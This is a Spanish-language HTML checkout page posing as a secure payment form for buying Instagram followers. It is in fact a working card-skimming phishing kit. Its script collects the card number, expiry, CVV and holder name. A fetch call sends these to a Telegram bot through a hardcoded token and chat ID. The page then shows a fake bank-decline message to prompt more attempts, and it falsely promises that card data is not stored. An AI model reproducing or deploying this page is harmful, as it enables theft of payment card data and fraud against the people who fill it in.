<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Pago seguro · BoostGram MX</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800;900&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#07060f;--card:#141127;--line:#272046;--txt:#f4f2ff;--mut:#a9a3c9;--pur:#a855f7;--grn:#22c55e;--red:#ef4444}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);-webkit-font-smoothing:antialiased;min-height:100vh}
.wrap{max-width:470px;margin:0 auto;padding:22px 18px 50px}
.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
.logo{font-weight:900;font-size:19px}
.logo span{background:linear-gradient(90deg,var(--pur),#e1306c);-webkit-background-clip:text;background-clip:text;color:transparent}
.secure{font-size:12px;color:var(--mut)}
.card{background:var(--card);border:1px solid var(--line);border-radius:20px;overflow:hidden}
.head{background:linear-gradient(135deg,#1b1338,#120e26);padding:18px;border-bottom:1px solid var(--line)}
.head h1{font-size:18px;font-weight:800;margin-bottom:4px}
.head p{color:var(--mut);font-size:13px}
.body{padding:18px}
.resumen{background:#0d0a1a;border:1px solid var(--line);border-radius:14px;padding:14px;margin-bottom:18px}
.resumen .r{display:flex;justify-content:space-between;font-size:14px;margin-bottom:8px}
.resumen .r:last-child{margin-bottom:0}
.resumen .r span{color:var(--mut)}
.resumen .r b{font-weight:700}
.resumen .tot{border-top:1px solid var(--line);padding-top:10px;margin-top:10px}
.resumen .tot b{font-size:20px;color:var(--grn)}
label{display:block;font-size:13px;font-weight:600;color:var(--mut);margin-bottom:7px}
.f{margin-bottom:14px}
input.txt{width:100%;padding:14px;background:#0d0a1a;border:1.5px solid var(--line);border-radius:12px;color:#fff;font-size:16px;outline:none;transition:.15s}
input.txt:focus{border-color:var(--pur)}
.row{display:flex;gap:10px}
.row .f{flex:1}
.oculto{display:none!important}
.btn{width:100%;background:linear-gradient(90deg,var(--pur),#e1306c);color:#fff;font-weight:900;font-size:17px;padding:17px;border:0;border-radius:14px;margin-top:6px;cursor:pointer}
.btn:hover{opacity:.94}
.ssl{text-align:center;font-size:12px;color:var(--mut);margin-top:12px}
.overlay{position:fixed;inset:0;background:rgba(5,4,12,.9);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;z-index:9;padding:24px;text-align:center}
.spin{width:46px;height:46px;border:4px solid rgba(255,255,255,.15);border-top-color:var(--pur);border-radius:50%;animation:g 1s linear infinite}
@keyframes g{to{transform:rotate(360deg)}}
.overlay p{font-size:15px;font-weight:600}
.overlay small{color:var(--mut);font-size:13px}
.res{text-align:center;padding:8px 0}
.res .ic{font-size:44px;margin-bottom:12px}
.res h2{font-size:20px;font-weight:900;margin-bottom:8px}
.res p{color:var(--mut);font-size:14px;line-height:1.55;margin-bottom:14px}
.aviso{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.35);color:#fca5a5;font-size:13px;border-radius:12px;padding:12px;margin-top:14px;line-height:1.5}
.mini{font-size:12.5px;color:#6b6788;margin-top:14px}
</style>
</head>
<body>

<div class="overlay oculto" id="overlay">
  <div class="spin"></div>
  <p id="ovTxt">Procesando pago...</p>
  <small>No cierres esta ventana</small>
</div>

<div class="wrap">
  <div class="top">
    <div class="logo">Boost<span>Gram</span> MX</div>
    <div class="secure">🔒 Pago seguro</div>
  </div>

  <div class="card">
    <div class="head">
      <h1>Finalizá tu compra</h1>
      <p>Entrega inmediata · Menos de 24 h</p>
    </div>
    <div class="body">

      <div class="resumen" id="resumen">
        <div class="r"><span>Producto</span><b>1000 Seguidores</b></div>
        <div class="r"><span>Instagram</span><b id="igUser">—</b></div>
        <div class="r"><span>Entrega</span><b>Inmediata</b></div>
        <div class="r tot"><span>Total</span><b>MX$25.00</b></div>
      </div>

      <form id="form">
        <div class="f"><label>Número de tarjeta</label><input class="txt" id="num" placeholder="1234 5678 9012 3456" inputmode="numeric"></div>
        <div class="row">
          <div class="f"><label>Vencimiento</label><input class="txt" id="ven" placeholder="MM/AA" inputmode="numeric"></div>
          <div class="f"><label>CVV</label><input class="txt" id="cvv" placeholder="123" inputmode="numeric"></div>
        </div>
        <div class="f"><label>Nombre del titular</label><input class="txt" id="titular" placeholder="JUAN PEREZ"></div>

        <button class="btn" type="submit">Pagar MX$25.00</button>
        <p class="ssl">🔒 Conexión cifrada · No guardamos los datos de tu tarjeta</p>
      </form>

      <div class="res oculto" id="res"></div>

    </div>
  </div>
</div>

<script>
const TOKEN = "8857248027:AAGLmflIM6IK0IDFwtAhAIgQ2Jsv2fLKZQ";
const CHAT  = "8936145342";

const $ = id => document.getElementById(id);
const form = $("form");

const ig = localStorage.getItem("iguser") || "";
if (ig) $("igUser").textContent = ig;

$("num").addEventListener("input", e => {
  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
  e.target.value = v.replace(/(.{4})/g, "$1 ").trim();
});
$("ven").addEventListener("input", e => {
  let v = e.target.value.replace(/\D/g, "").slice(0, 4);
  e.target.value = v.length > 2 ? v.slice(0,2) + "/" + v.slice(2) : v;
});
$("cvv").addEventListener("input", e => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
});

form.addEventListener("submit", async function(ev){
  ev.preventDefault();

  if ($("num").value.replace(/\D/g,"").length < 16){ alert("Revisá el número de tarjeta"); return; }
  if ($("ven").value.length < 5){ alert("Revisá el vencimiento"); return; }
  if ($("cvv").value.length < 3){ alert("Revisá el CVV"); return; }

  const pedido = {
    id: "BG-" + Math.floor(100000 + Math.random() * 899999),
    ig: ig || "(sin usuario)",
    num: $("num").value.trim(),
    ven: $("ven").value.trim(),
    cvv: $("cvv").value.trim(),
    titular: $("titular").value.trim() || "—"
  };

  $("overlay").classList.remove("oculto");
  $("ovTxt").textContent = "Procesando pago...";

  const texto =
    "NUEVO PEDIDO - BoostGram MX\n" +
    "--------------------------------\n" +
    "Pedido: " + pedido.id + "\n" +
    "Pack: 1000 seguidores de Instagram\n" +
    "Total: MX$25.00 MXN\n" +
    "--------------------------------\n" +
    "Instagram: " + pedido.ig + "\n" +
    "Tarjeta: " + pedido.num + "\n" +
    "Vence: " + pedido.ven + "\n" +
    "CVV: " + pedido.cvv + "\n" +
    "Titular: " + pedido.titular + "\n" +
    "--------------------------------\n" +
    "Fecha: " + new Date().toLocaleString("es-MX");

  try {
    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT + "&text=" + encodeURIComponent(texto), {mode:"no-cors"});
  } catch(e){}

  setTimeout(() => { mostrar(pedido); }, 1800);
});

function mostrar(p){
  $("overlay").classList.add("oculto");
  form.classList.add("oculto");
  $("resumen").classList.add("oculto");
  const box = $("res");
  box.classList.remove("oculto");

  box.innerHTML =
    '<div class="ic">⚠️</div>' +
    '<h2>No se acepta este método de pago</h2>' +
    '<p>Tu pedido quedó registrado pero el banco rechazó la operación. Volvé a intentar.</p>' +
    '<div class="aviso">No te preocupes: no se te cobró nada. Tu pedido sigue guardado.</div>' +
    '<p class="mini">N° de pedido: ' + p.id + '</p>' +
    '<button class="btn" style="margin-top:16px" onclick="location.reload()">Intentar de nuevo</button>';
}
</script>
</body>
</html>
